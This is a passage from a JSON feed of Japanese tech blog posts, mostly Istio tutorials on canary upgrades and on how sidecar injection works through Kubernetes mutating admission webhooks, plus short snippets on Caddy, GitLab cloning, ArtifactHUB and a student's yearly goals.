revisions and tagsistioctl tag setコマンドistioctl tag setコマンドを実行し、istio.io/revラベルの値と宛先のServiceを変更します。$ istioctl tag set default --revision 1-15-4 --overwrite実行後に、もう一度MutatingWebhookConfigurationを確認すると、istio.io/revラベルの値が変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-15-4istio.io/tag: default...また、Webhookの宛先のServiceも変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-15-4...これらにより、Webhookの宛先が 1-15-4 のService となります。そのため、 1-15-4 の istio-proxy コンテナをインジェクションできる ようになります。今の状況は以下の通りです\uD83D\uDC47(4) Istio IngressGatewayをインプレースアップグレードここで実施することWebhookの宛先が1-15-4のServiceに変わったところで、Istio IngressGatewayをインプレースアップグレードします。In place upgradekubectl rollout restartコマンドkubectl rollout restartコマンドを実行し、Istio IngressGatewayをインプレースアップグレードします。$ kubectl rollout restart deployment istio-ingressgateway-n istio-ingress再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'docker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47▶︎ Istio IngressGatewayの通信遮断について(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施すること続けて、一部のNamespaceのistio-proxyコンテナをアップグレードします。Podの再作成により、新Istiodのistio-proxyコンテナがインジェクションされるため。istio-proxyコンテナをアップグレードできます。Data planekubectl rollout restartコマンド前提にあるように、Namespaceには foo bar baz があります。kubectl rollout restartコマンドを実行し、barのistio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment bar -n bar再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'bar-app:1.0 # マイクロサービスdocker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47(6) ユーザの手を借りたテストここで実施することIstioを部分的にアップグレードしたところで、アップグレードが完了したNamespaceをテストします。ユーザーの手を借りて実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。今の状況は以下の通りです\uD83D\uDC47もし問題が起こった場合もし問題が起こった場合、1-14-6にダウングレードしていきます。istioctl tag setコマンドを実行し、istio.io/revラベルの値を元に戻します。$ istioctl tag set default --revision 1-14-6 --overwriteその後、kubectl rollout restartコマンドの手順を実行し、istio-proxyコンテナをダウングレードしてきます。(7) istio-proxyコンテナの段階的アップグレードここで実施すること先ほどのNamespaceで問題が起こらなければ、残ったNamespace (foo、baz、...) のistio-proxyコンテナも段階的にアップグレードしていきます。kubectl rollout restartコマンド同様にkubectl rollout restartコマンドを実行し、istio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment foo -n foo$ kubectl rollout restart deployment baz -n baz...最終的に、全てのNamespacemのistio-proxyコンテナが新しくなります。今の状況は以下の通りです\uD83D\uDC47(8) 旧Istiodのアンインストールここで実施すること最後に、旧Istiodのアンインストールします。Uninstall old control planeistioctl uninstallコマンドistioctl uninstallコマンドを実行し、旧Istiodをアンインストールします。$ istioctl uninstall --revision 1-14-6✅ Uninstall complete今の状況は以下の通りです\uD83D\uDC47kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl uninstallコマンドで何をアンインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6というDeploymentが無くなっています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-15-4   1/1     1            1           47s # 1-15-4▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-14-6というServiceが無くなっています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-14-6というMutatingWebhookConfigurationが無くなっています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # 次のカナリアアップグレードでも使用するistio-sidecar-injector-1-15-4   2          2m16sこれで、新Istiodに完全に入れ替わったため、アップグレードは完了です。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて06. おわりにIstioを安全にアップグレードするカナリア方式とその仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。これからIstioを採用予定の方は、Istioを安全にアップグレードするために十分に準備しておくことをお勧めします\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-02-26T11:25:48.000Z","dateMiliSeconds":1677410748000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"LINE に送ったメッセージを Google Home に読み上げさせる","link":"https://blog.1q77.com/2023/02/line-bot-tts/","contentSnippet":"令和の時代、家に固定電話はなく、外出先から家族に直ぐに答えて欲しいことがあってもスマホはマナーモードで手元に置いてなければ気づくことができません。","isoDate":"2023-02-25T12:51:58.000Z","dateMiliSeconds":1677329518000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Caddy の Internal TLS 証明書の有効期間を指定する","link":"https://blog.1q77.com/2023/02/caddy-internal-tls-cert-lifetime/","contentSnippet":"以前 ワンライナーで https の Reverse Proxy を実行する という記事で Caddy を使うと local での開発用に任意のドメインの証明書を簡単に発行できるし CA の証明書も OS の証明書ストアに保存してくれるため、ブラウザでアクセスしても警告が出なくて便利というのを書きました。","isoDate":"2023-02-09T14:29:32.000Z","dateMiliSeconds":1675952972000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の目標","link":"https://moz-security.hatenablog.com/entry/2023/02/01/112627","contentSnippet":"前回のブログで「近々、新年の抱負として、今年やりたいことを書きたいと思っています。」と書いておきながら、もう少しで１ヶ月が経ってしまいます。（近々とは？って感じですけど 笑）１月は、大学のテストと溜まりに溜まった課題で手一杯でしたが、1月31日でそれも終わり、ひと段落したため、今年の目標について書いていこうと思います。目標は大きく4つあります。1つ目は、大学の研究です。これは目標というよりも、頑張ることになってますね。どれだけ独学で勉強しても、趣味でいろいろシステム開発しても、まずは大学を卒業しなければ、学士にはなれないため、これは間違いなく最優先で行わなければいけません。大学の授業としても、あと残っているのが卒業研究だけであるため、今年大学でやること・頑張ることはこれだけかなと思います。大学に行って、ひたすら研究、研究、研究になる気がします。2つ目は、Hack The BoxでHackerランクになることです。昨年の3月ごろからHack The Boxを始めて、時間があるときに取り組んでいましたが、Starting Pointのいろいろな箇所で詰まったり、そもそも時間を十分に取れなかったりして、あまり攻略できていませんでした。今年は、授業もあまりなく、時間も取れそうなため、本腰を入れて頑張りたいと思います。具体的な数字でいうと、少なくとも毎日１時間、朝８時〜９時までをHack The Boxを攻略する時間に当てようと思っています。理想は、2時間、3時間、時間が取れるならそれよりもという感じなんですけど、日によっては、忙しい日もあるので、そんな日でも取れそうな最低限の1時間にしました。こういうのは1日に頑張りすぎるよりも、継続することが大事だと思うので、毎日コツコツやっていきたいと思います。将来的にはセキュリティ関連の仕事をしたいため、攻撃を通して防御を学び、防御を通して攻撃を学んでいきたいと思います。3つ目は、資格の取得です。今まで、基本情報技術者、応用情報技術者を取ってきたため、今年は、情報処理安全確保支援士に挑戦したいと思っています。資格は、知識問題でしかないから、社会では使えないという意見もあり、自分でも知識(知っていること) とスキル(できること)は違うと思っているため、半分は同意できるのですが、一方で、資格を取るために勉強するというこの資格を取るまでの過程が大事だとも思っています。また、幅広く体系的な知識を習得できるというのも資格取得のメリットだと思っています。情報処理安全確保支援士取得に向けて、これから頑張りたいと思います。4つ目は、学外のイベントに参加することです。セキュリティキャンプやSecHack365といったセキュリティ関連のイベントに加え、ハッカソンやカンファレンスにも参加していきたいと思っています。前までは、自分のスキルでは学外イベントに参加するのは恥ずかしいと思い、挑戦できていなかったのですが、昨年、ハッカソンやセキュリティ・ミニキャンプに参加することで、参加する人全員がすごい人ではなく、自分と似たような人もいるし、イベントを通して、成長したいという人がたくさんいることも知りました。今年は、昨年に引き続き、より多くのイベントに参加し、成長できる環境に自分から臨んでいきたいと思います。1月も終わり、今年もあと11ヶ月になりましたが、いろいろな経験をして、たくさんの人に出会い、成長できたと言える1年にしていきたいと思います。","isoDate":"2023-02-01T02:26:27.000Z","dateMiliSeconds":1675218387000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GitLabで指定したグループ内の全てのリポジトリを一括でcloneする","link":"https://zenn.dev/tayusa/articles/ae5911391c9440","contentSnippet":"概要1個1個丹精込めて手動でcloneすることに限界を感じたので、一括で自分に関連するリポジトリをcloneする シェルスクリプト.zshrc# リポジトリのディレクトリを作成してからcloneする# 第1引数 URL(https://gitlab.example.com/diaspora/diaspora-client.git)function git_clone_to_path() {  [[ -z ${commands[git]} ]] \\\\    && { echo \'git is required\'; return 1; }  loca...","isoDate":"2023-01-29T17:07:31.000Z","dateMiliSeconds":1675012051000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ArtifactHUBについてのメモ","link":"https://zenn.dev/bells17/articles/artifacthub-note","contentSnippet":"ArtifactHUB というコンテナイメージHelm Chartなどを登録・検索することのできるツールを試してみたのでメモ。https://artifacthub.io/ ArtifactHUB についてコンテナイメージHelm Chartなどを「リポジトリ」として登録・検索することができるよう。登録できるリポジトリの種類は下記で確認できる。https://artifacthub.io/docs/topics/repositories/アカウント登録方法は現在下記の3つがあるemailgithubgoogle リポジトリの登録リポジトリ登...","isoDate":"2023-01-21T18:21:58.000Z","dateMiliSeconds":1674325318000,"authorName":"bells17","authorId":"bells17"},{"title":"container-structure-testによるコンテナのテスト","link":"https://zenn.dev/bells17/articles/container-structure-test","contentSnippet":"Googleが作成しているcontainer-structure-testというコンテナをテストするツールを試したのでメモ。かなり単純なツールなのでぶっちゃけREADMEに書いてあることを読めばわかるんだけど一応情報をまとめた。https://github.com/GoogleContainerTools/container-structure-testGoogleのブログで紹介されている記事はこちら。https://opensource.googleblog.com/2018/01/container-structure-tests-unit-tests.html cont...","isoDate":"2023-01-21T10:54:17.000Z","dateMiliSeconds":1674298457000,"authorName":"bells17","authorId":"bells17"},{"title":"【Istio⛵️】サービスメッシュの登場経緯とIstioサイドカーインジェクションの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/01/14/223815","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️代表的なサービスメッシュの種類についてIstioのサイドカーインジェクションの仕組みについてこの記事から得られる知識01. はじめに02. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかサービスメッシュのモデルサイドカープロキシメッシュ03. admission-controllersアドオンについてadmission-controllersアドオンとはadmissionプラグインの種類MutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはAdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReview▼ AdmissionRequest▼ AdmissionResponse04. サイドカーインジェクションの仕組み全体のフロークライアント ➡︎ kube-apiserverここで説明するフロー箇所(1) Podの作成をリクエストkube-apiserver ➡︎ Serviceここで説明するフロー箇所(2) 認証/認可処理をコール(3) アドオンの処理をコール(4) AdmissionRequestに値を詰める(5) AdmissionReviewを送信Service ➡︎ webhookサーバーここで説明するフロー箇所(6) 15017番ポートにポートフォワーディングkube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所(7) patch処理を定義(8) AdmissionResponseに値を詰める(9) AdmissionReviewを返信kube-apiserver ➡︎ etcdここで説明するフロー箇所(10) patch処理をコール(11) マニフェストを永続化クライアント ⬅︎ kube-apiserverここで説明するフロー箇所(12) コール完了を返信以降の仕組み05. おわりに記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4Fさて、前回の記事の時と同様に、最近の業務でもオンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、サービスメッシュを実装するIstioサイドカーインジェクションを記事で解説しました。解説するのは、執筆時点 (2023/01/14) 時点で最新の 1.14 系のIstioです。執筆時点 (2023/01/14) では、Istioが実装するサービメッシュには、『サイドカープロキシメッシュ』と『アンビエントメッシュ』があります。サイドカープロキシメッシュの仕組みの軸になっているものは、サイドカーコンテナであるistio-proxyコンテナです。Istioは、KubernetesのPodの作成時に、istio-proxyコンテナをPod内に自動的にインジェクション (注入) しますそれでは、もりもり布教していきます\uD83D\uDE1702. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかそもそも、なぜサービスメッシュが登場したのでしょうか。マイクロサービスアーキテクチャのシステムには、アーキテクチャ固有のインフラ領域の問題 (例：サービスディスカバリーの必要性、マイクロサービス間通信の暗号化、テレメトリー作成など) があります。アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装すれば、これらの問題の解決できます。しかし、アプリエンジニアはアプリ領域の問題に責務を持ち、インフラ領域の問題はインフラエンジニアで解決するようにした方が、互いに効率的に開発できます。そこで、インフラ領域の問題を解決するロジックをサイドカーとして切り分けます。これにより、アプリエンジニアとインフラエンジニアの責務を分離可能になり、凝集度が高くなります。また、インフラ領域の共通ロジックをサイドカーとして各マイクロサービスに提供できるため、単純性が高まります。こういった流れの中で、サービスメッシュが登場しました。servicemesh.es | Service Mesh ComparisonWhat is Service Mesh and why is it needed in Kubernetes?サービスメッシュのモデル前述の通り、サービスメッシュの登場前は、アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装していました。これを、『共有ライブラリモデル』と呼びます。その後、『サイドカーモデル』とも呼ばれるサイドカープロキシメッシュが登場しました。執筆時点 (2023/01/14) では、『カーネルモデル』とも呼ばれるサイドカーフリーメッシュが登場しています。サイドカープロキシメッシュIstioのサイドカーによるサービスメッシュ (サイドカープロキシメッシュ) は、サイドカーコンテナ (istio-proxyコンテナ) が稼働するデータプレーンサイドカーを中央集権的に管理するIstiod (discoveryコンテナ) が稼働するコントロールプレーンからなります。Istio / Architecture03. admission-controllersアドオンについてadmission-controllersアドオンとはIstioのPod内へのサイドカーインジェクションの前提知識として、admission-controllersアドオンを理解する必要があります。もし、admission-controllersアドオンをご存知の方は、 04. サイドカーインジェクションの仕組み まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍kube-apiserverでは、admission-controllersアドオンを有効化できます。有効化すると、認証ステップと認可ステップの後にmutating-admissionステップとvalidating-admissionステップを実行でき、admissionプラグインの種類に応じた処理を挿入できます。クライアント (kubectlクライアント、Kubernetesリソース) からのリクエスト (例：Kubernetesリソースに対する作成/更新/削除、kube-apiserverからのプロキシへの転送) 時に、各ステップでadmissionプラグインによる処理 (例：アドオンビルトイン処理、独自処理) を発火させられます。Admission Control in Kubernetes | KubernetesKubernetes Best Practices: Blueprints for Building Successful Applications on Kubernetesadmissionプラグインの種類admission-controllersアドオンのadmissionプラグインには、たくさんの種類があります。IstioがPod内にサイドカーをインジェクションする時に使用しているアドオンは、『MutatingAdmissionWebhook』です。CertificateApprovalCertificateSigningCertificateSubjectRestrictionDefaultIngressClassDefaultStorageClassDefaultTolerationSecondsLimitRanger\\"MutatingAdmissionWebhook\\" \uD83D\uDC48 これNamespaceLifecyclePersistentVolumeClaimResizePodSecurityPriorityResourceQuotaRuntimeClassServiceAccountStorageObjectInUseProtectionTaintNodesByConditionValidatingAdmissionWebhookAdmission Control in Kubernetes | KubernetesMutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはMutatingAdmissionWebhookプラグインを使用すると、mutating-admissionステップ時に、リクエスト内容を変更する処理をフックできます。フックする具体的な処理として、webhookサーバーにAdmissionRequestリクエストとして送信することにより、レスポンスのAdmissionResponseに応じてリクエスト内容を動的に変更します。MutatingWebhookConfigurationで、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を設定します。MutatingWebhookConfigurationの具体的な実装については、サイドカーインジェクションの仕組みの中で説明していきます。Diving into Kubernetes MutatingAdmissionWebhook | by Morven Cao | IBM Cloud | MediumKubernetes Admission Webhook覚書き - gashirar\'s blogAdmission Webhookを作って遊んで、その仕組みを理解しよう（説明編）AdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReviewAdmissionReviewは以下のようなJSONであり、kube-apiserverとwebhookサーバーの間でAdmissionRequestとAdmissionResponseを運びます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {},  # AdmissionResponse  \\"response\\": {},}v1 package - k8s.io/api/admission/v1 - Go Packages▼ AdmissionRequestAdmissionRequestは以下のようなJSONです。kube-apiserverがクライアントから受信した操作内容が持つことがわかります。例で挙げたAdmissionRequestでは、クライアントがDeploymentをCREATE操作するリクエストをkube-apiserverに送信したことがわかります。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"apps\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"deployments\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}Dynamic Admission Control | Kubernetes▼ AdmissionResponse一方でAdmissionResponseは、例えば以下のようなJSONです。AdmissionResponseは、マニフェスト変更処理をpatchキーの値に持ち、これはbase64方式でエンコードされています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"<value from request.uid>\\",      # 宛先のwebhookサーバーが受信したか否かを表す。      \\"allowed\\": true,      # PathによるPatch処理を行う。      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvcmVwbGljYXMiLCAidmFsdWUiOiAzfV0=\\",    },}エンコード値をデコードしてみると、例えば以下のようなpatch処理が定義されています。# patchキーをbase64方式でデコードした場合[{\\"op\\": \\"add\\", \\"path\\": \\"/spec/replicas\\", \\"value\\": 3}]マニフェストに対する操作 (op) 、キー (path) 、値 (value) が設定されています。kube-apiserverがこれを受信すると、指定されたキー (.spec.replicas) に値 (3) に追加します。Dynamic Admission Control | Kubernetes04. サイドカーインジェクションの仕組み全体のフロー前提知識を踏まえた上で、admission-controllersアドオンの仕組みの中で、サイドカーのistio-proxyコンテナがどのようにPodにインジェクションされるのかを見ていきましょう。最初に、サイドカーインジェクションのフローは以下の通りになっています。(画像はタブ開き閲覧を推奨)Istio in Action (English Edition)クライアント ➡︎ kube-apiserverここで説明するフロー箇所『クライアント ➡︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(1) Podの作成をリクエストまずは、クライアントがkube-apiserverにリクエストを送信するところです。クライアント (Deployment、DaemonSet、StatefulSet、を含む) は、Podの作成リクエストをkube-apiserverに送信します。この時のリクエスト内容は、以下の通りとします。# Podを作成する。$ kubectl apply -f foo-pod.yaml# foo-pod.yamlファイルapiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80またNamespaceでは、あらかじめistio-proxyコンテナのインジェクションが有効化されているとします。Istioではv1.10以降、リビジョンの番号のエイリアスを使用して、istio-proxyコンテナのインジェクションを有効化するようになりました。apiVersion: v1kind: Namespacemetadata:  name: foo-namespace  labels:    # istio-proxyコンテナのインジェクションを有効化する。    # エイリアスは自由    istio.io/rev: <エイリアス>Istio / Announcing Support for 1.8 to 1.10 Direct Upgrades▶ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dkube-apiserver ➡︎ Serviceここで説明するフロー箇所『kube-apiserver ➡︎ Service』の箇所を説明します。(画像はタブ開き閲覧を推奨)(2) 認証/認可処理をコールkube-apiserverは、認証ステップと認可ステップにて、クライアントからのリクエストを許可します。(3) アドオンの処理をコールkube-apiserverは、mutating-admissionステップにて、MutatingAdmissionWebhookプラグインの処理をコールします。前提知識の部分で具体的な実装を省略しましたが、Istioのバージョン1.14.3時点で、MutatingWebhookConfigurationは以下のようになっています。Namespaceでサイドカーインジェクションを有効化する時に使用したエイリアスは、このMutatingWebhookConfigurationで実体のリビジョン番号と紐づいています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yamlapiVersion: admissionregistration.k8s.io/v1beta1kind: MutatingWebhookConfigurationmetadata:  name: istio-revision-tag-default  labels:    app: sidecar-injector    # エイリアスの実体    istio.io/rev: <リビジョン番号>    # リビジョン番号のエイリアス    istio.io/tag: <エイリアス>webhooks:  - name: rev.namespace.sidecar-injector.istio.io    # MutatingAdmissionWebhookプラグインの処理の発火条件を登録する。    rules:      - apiGroups: [\\"\\"]        apiVersions: [\\"v1\\"]        operations: [\\"CREATE\\"]        resources: [\\"pods\\"]        scope: \\"*\\"    # Webhookの前段にあるServiceの情報を登録する。    clientConfig:      service:        name: istiod-<リビジョン番号>        namespace: istio-system        path: \\"/inject\\" # エンドポイント        port: 443      caBundle: Ci0tLS0tQk ...    # Namespace単位のサイドカーインジェクション    # 特定のNamespaceでMutatingAdmissionWebhookプラグインの処理を発火させる。    namespaceSelector:      matchExpressions:        - key: istio.io/rev          operator: DoesNotExist        - key: istio-injection          operator: DoesNotExist    # Pod単位のサイドカーインジェクション    # 特定のオブジェクトでMutatingAdmissionWebhookプラグインの処理を発火させる。    objectSelector:      matchExpressions:        - key: sidecar.istio.io/inject          operator: NotIn          values:            - \\"false\\"        - key: istio.io/rev          operator: In          values:            - <エイリアス>    ...MutatingWebhookConfigurationには、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を定義します。MutatingAdmissionWebhookプラグインの発火条件に関して、例えばIstioでは、 NamespaceやPod.metadata.labelsキーに応じてサイドカーインジェクションの有効化/無効化を切り替えることができ、これをMutatingAdmissionWebhookプラグインで制御しています。webhookサーバーの宛先情報に関して、Istioではwebhookサーバーの前段にServiceを配置しています。MutatingAdmissionWebhookプラグインが発火した場合、Serviceの/inject:443にHTTPSプロトコルのリクエストを送信するようになっています。また、宛先のServiceの名前がistiod-<リビジョン番号>となっていることからもわかるように、Serviceは特定のバージョンのIstiodコントロールプレーンに対応しており、想定外のバージョンのIstiodコントロールプレーンを指定しないように制御しています。一方で発火しなかった場合には、以降のAdmissionReviewの処理には進みません。(4) AdmissionRequestに値を詰めるkube-apiserverは、mutating-admissionステップにて、クライアントからのリクエスト内容 (Podの作成リクエスト) をAdmissionReveiew構造体のAdmissionRequestに詰めます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"core\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"pods\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}(5) AdmissionReviewを送信kube-apiserverは、mutating-admissionステップにて、Serviceの/inject:443にAdmissionReview構造体を送信します。Service ➡︎ webhookサーバーここで説明するフロー箇所『Service ➡︎ webhookサーバー』の箇所を説明します。(画像はタブ開き閲覧を推奨)(6) 15017番ポートにポートフォワーディングServiceは、/inject:443でリクエストを受信し、discoveryコンテナの15017番ポートにポートフォワーディングします。Istioのバージョン1.14.3時点で、Serviceは以下のようになっています。$ kubectl get svc istiod-service -n istio-system -o yamlapiVersion: v1kind: Servicemetadata:  labels:    app: istiod  name: istiod-<リビジョン番号>  namespace: istio-systemspec:  type: ClusterIP  selector:    app: istiod    istio.io/rev: <リビジョン番号>  ports:    - name: grpc-xds      port: 15010      protocol: TCP      targetPort: 15010    - name: https-dns      port: 15012      protocol: TCP      targetPort: 15012    # webhookサーバーにポートフォワーディングする。    - name: https-webhook      port: 443      protocol: TCP      targetPort: 15017    - name: http-monitoring      port: 15014      protocol: TCP      targetPort: 15014.spec.selector.istio.io/revキーに、ポートフォワーディング先のPodを指定するためのリビジョン番号が設定されており、このPodはdiscoveryコンテナを持ちます。Istioは、discoveryコンテナ内でwebhookサーバーを実行し、15017番ポートでリクエストを待ち受けます。▶ istio.io/rev`discovery`コンテナの待ち受けポートについてdiscoveryコンテナがリクエストを待ち受けているポート番号を見てみると、15017番ポートでリッスンしていることを確認できます\uD83D\uDC4D$ kubectl exec foo-istiod -n istio-system -- netstat -tulpnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      1/pilot-discoverytcp6       0      0 :::15017                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::8080                 :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15010                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15012                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15014                :::*                    LISTEN      1/pilot-discoveryistio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubhttps://istio.io/latest/docs/ops/deployment/requirements/#ports-used-by-istiokube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所『kube-apiserver ⬅︎ Service ⬅︎ webhookサーバー』の箇所を説明します。矢印が逆向きなことに注意してください。(画像はタブ開き閲覧を推奨)(7) patch処理を定義仕組みの中でも、ここは重要な部分です。discoveryコンテナ内のwebhookサーバーは、リクエスト内容を書き換えるためのpatch処理を定義します。webhookサーバーは、マニフェストの.spec.containers[1]パスにistio-proxyキーを追加させるようなpatch処理を定義します。この定義によって、結果的にサイドカーのインジェクションが起こるということになります。[  ...  {    \\"op\\": \\"add\\",    # .spec.initContainers[1] を指定する。    \\"path\\": \\"/spec/initContainers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-init\\",      \\"resources\\": {                     ...      }    }  },  {    \\"op\\": \\"add\\",    # .spec.containers[1] を指定する。    \\"path\\": \\"/spec/containers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-proxy\\",      \\"resources\\": {                     ...      }    }  }  ...]istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubistio/pkg/kube/inject/webhook_test.go at 1.14.3 \xb7 istio/istio \xb7 GitHubこの時、サイドカーのテンプレートに割り当てられた値が、patch処理を内容を決めます。type SidecarTemplateData struct {    TypeMeta             metav1.TypeMeta    DeploymentMeta       metav1.ObjectMeta    ObjectMeta           metav1.ObjectMeta    Spec                 corev1.PodSpec    ProxyConfig          *meshconfig.ProxyConfig    MeshConfig           *meshconfig.MeshConfig    Values               map[string]interface{}    Revision             string    EstimatedConcurrency int    ProxyImage           string}...istio/pkg/kube/inject/inject.go at 1.14.3 \xb7 istio/istio \xb7 GitHub▶ patch処理でインジェクションするコンテナについてistio-proxyコンテナの他に、InitContainerのistio-initコンテナもインジェクション可能にします。このistio-initコンテナは、Pod内にiptablesのルールを適用し、Podのインバウンド通信／アウトバウンド通信をistio-proxyコンテナにリダイレクトさせる責務を担います\uD83D\uDCAA\uD83C\uDFFBIstio Sidecar\'s interception mechanism for traffic - SoByte(8) AdmissionResponseに値を詰めるdiscoveryコンテナ内のwebhookサーバーは、patch処理の定義をAdmissionReveiew構造体のAdmissionResponseに詰めます。patchキーの値に、先ほどのpatch処理の定義をbase64方式でエンコードした文字列が割り当てられています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"*****\\",      \\"allowed\\": true,      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"<先ほどのpatch処理の定義をbase64方式でエンコードした文字列>\\",    },}istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub(9) AdmissionReviewを返信discoveryコンテナ内のwebhookサーバーは、AdmissionReview構造体をレスポンスとしてkube-apiserverに返信します。kube-apiserver ➡︎ etcdここで説明するフロー箇所『kube-apiserver ➡︎ etcd』の箇所を説明します。(画像はタブ開き閲覧を推奨)(10) patch処理をコールkube-apiserverは、AdmissionReview構造体を受信し、AdmissionResponseに応じてリクエスト内容を書き換えます。patch処理の定義をAdmissionReview構造体から取り出し、クライアントからのリクエスト内容を書き換えます。具体的には、istio-proxyコンテナとistio-initコンテナを作成するために、リクエストしたマニフェストの該当箇所にキーを追加します。apiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80    # kube-apiserverが追加    - name: istio-proxy      ...  # kube-apiserverが追加  initContainers:    - name: istio-init    ...(11) 